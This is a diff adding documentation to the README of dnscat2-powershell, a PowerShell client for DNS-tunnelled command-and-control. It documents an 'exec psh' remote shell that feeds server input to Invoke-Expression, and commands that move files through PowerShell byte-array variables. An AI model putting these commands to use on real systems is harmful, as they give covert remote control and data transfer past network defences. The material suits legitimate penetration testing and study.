@@ -28,6 +28,19 @@ Start-Dnscat2 is the actual function used as the client. Specifiy the dnscat2 se
     Do not encrypt the session. Encryption is enabled by default.
         Start-Dnscat2 -Domain <dnscat2 server> -NoEncryption
 
+### Powershell Command Session Commands
+
+The client can handle normal dnscat2 commands, or the *powershell version* of that command. To use the powershell version of a command, set specific parameters the client will detect (These are commands run from a command session on the server):
+
+    Start a new session which simulates a Powershell shell, like ExecPS:
+        exec psh
+
+    Upload app.exe on the server into a byte array stored in the $app powershell variable:
+        upload app.exe bytes:$app
+    
+    Download the byte array stored in the $app powershell variable to app.exe on the server:
+        download bytes:$app app.exe
+
 ### Start-Dnscat2
 
     -Domain <String>          The Domain being used by the dnscat2 server.
@@ -47,6 +60,10 @@ Start-Dnscat2 is the actual function used as the client. Specifiy the dnscat2 se
     -Delay <Int32>            Set a delay between each request, in milliseconds. (Default: 0)
     -MaxPacketSize <Int32>    Maximum length of a dnscat2 packet. (Default: 240)
     -Name <String>            The name of your dnscat2 session. (Default: hostname)
+
+### ExecPS and 'exec psh'
+
+dnscat2-powershell simulates a powershell session by passing data from the server to Invoke-Expression. Only stdout is returned, and variables are preserved as long as the client is running. **Watch out** for things that exit powershell like "exit" and "break", because the entire dnscat2-powershell client will exit, not just the ExecPS session.
 
 ### Currently Unsupported Features
     A and AAAA requests are not supported
